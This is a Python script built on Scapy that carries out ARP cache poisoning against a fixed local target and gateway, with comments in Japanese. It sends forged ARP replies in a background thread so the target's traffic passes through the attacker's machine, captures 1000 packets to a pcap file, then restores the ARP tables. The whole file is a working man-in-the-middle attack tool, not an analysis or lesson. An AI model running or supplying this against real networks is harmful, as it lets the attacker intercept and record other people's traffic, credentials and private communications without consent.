from scapy.all import *
import os
import sys
import threading
import signal


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # sendによる復元
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac(ip_address):
    responces, unanswered = srp(Ether(
        dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    # レスポンス内のMACアドレスを返却
    for s, r in responces:
        return r[Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, stop_event):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [Ctrl-C to stop]")

    while True:
        send(poison_target)
        send(poison_gateway)

        if stop_event.wait(2):
            break

    print("[*] ARP poison attack finished.")
    return


interface = "wlp4s0"
target_ip = "192.168.0.15"
gateway_ip = "192.168.0.1"
packet_count = 1000
conf.iface = interface

# 出力の停止
conf.verb = 0

print("[*] Setting up {}".format(interface))

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting...")
    sys.exit(1)
else:
    print("[*] Gateway {0} is at {1}".format(gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting...")
    sys.exit(1)
else:
    print("[*] Target {0} is at {1}".format(target_ip, target_mac))

# 汚染用スレッドの起動
stop_event = threading.Event()
poison_thread = threading.Thread(target=poison_target,
                                 args=(gateway_ip, gateway_mac, target_ip, target_mac, stop_event))
poison_thread.start()

print("[*] Starting sniffer for {} packets ".format(packet_count))
bpf_filter = "ip host {}".format(target_ip)

packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

# キャプチャーしたパケットの保存
wrpcap('arper.pcap', packets)

# 汚染用スレッドの停止
stop_event.set()
poison_thread.join()

# ネットワークの復元
restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
